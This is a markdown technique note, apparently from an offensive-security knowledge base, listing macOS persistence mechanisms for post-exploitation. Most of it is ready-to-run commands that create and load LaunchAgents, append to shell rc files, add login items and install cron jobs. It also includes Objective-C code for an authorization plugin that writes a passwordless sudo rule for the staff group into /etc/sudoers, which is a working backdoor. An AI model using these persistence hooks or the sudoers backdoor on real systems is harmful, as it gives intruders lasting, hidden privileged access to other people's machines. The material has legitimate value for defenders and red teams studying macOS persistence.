---
title: "macOS Persistence"
type: technique
tags: [macos, persistence, post-exploitation]
phase: post-exploitation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-macos]
---

## Persistence and auto-start locations

macOS offers many auto-start hooks at different privilege and trigger levels. The workhorses are launchd agents/daemons, login items, shell rc files, and (for root, most powerful) authorization plugins. A plist owned by a user but placed in a system folder still runs as that user.

launchd LaunchAgents (login) and LaunchDaemons (boot). User paths `~/Library/LaunchAgents`; system paths `/Library/LaunchAgents`, `/Library/LaunchDaemons` (root, boot).

```bash
cat > ~/Library/LaunchAgents/com.example.agent.plist <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.example.agent</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>touch /tmp/launched</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
EOF
launchctl load ~/Library/LaunchAgents/com.example.agent.plist
launchctl list
```

Shell startup files (also a sandbox/TCC bypass if a privileged app spawns a shell):

```bash
echo "touch /tmp/persist" >> ~/.zshrc   # also ~/.zshenv ~/.zprofile ~/.bashrc
```

Login items via System Events:

```bash
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/app", hidden:false}'
osascript -e 'tell application "System Events" to get the name of every login item'
```

Cron (per-user, no root):

```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron"' | crontab -
```

Authorization plugins (root, runs at every login, ideal for credential theft or a sudo backdoor). Drop a bundle in `/Library/Security/SecurityAgentPlugins/` and register an authorizationdb rule:

```objc
// gcc -bundle -framework Foundation main.m -o CustomAuth
__attribute__((constructor)) static void run() {
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
security authorizationdb write com.evil.rule < /tmp/rule.plist   # class evaluate-mechanisms, mechanism "CustomAuth:login,privileged"
```

Other locations: reopened-apps plist (`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`), Login/Logout hooks (`defaults write com.apple.loginwindow LoginHook`), periodic scripts (`/etc/periodic/`, `*.local`), at jobs, Dock impersonation (`com.apple.dock.plist`), and a ZIP dropped in `~/Library` containing `LaunchAgents/x.plist` (Archive Utility auto-extracts on login). A user-writable root LaunchDaemon slot turns this same launchd mechanism into privilege escalation (see [[macos-privesc]]).
